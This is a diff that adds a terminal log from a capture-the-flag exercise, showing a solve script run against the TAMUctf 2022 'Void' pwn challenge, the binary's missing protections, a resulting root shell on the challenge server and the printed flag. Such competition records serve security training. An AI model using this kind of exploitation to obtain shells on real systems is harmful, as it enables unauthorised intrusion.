@@ -1,0 +1,18 @@
+mito@ubuntu:~/CTF/TAMUctf_2022/Pwn_Void$ python3 solve.py r
+[*] '/home/mito/CTF/TAMUctf_2022/Pwn_Void/void'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to tamuctf.com on port 443: Done
+[*] Switching to interactive mode
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+$ ls -l
+total 20
+-rw-r--r-- 1 root root   67 Apr 15 01:37 docker_entrypoint.sh
+-rw-r--r-- 1 root root   38 Apr 14 12:33 flag.txt
+-rwxr-xr-x 1 root root 9376 Apr 15 01:37 void
+$ cat flag.txt
+gigem{1_6u355_7h475_h0w_w3_3xpl017_17}
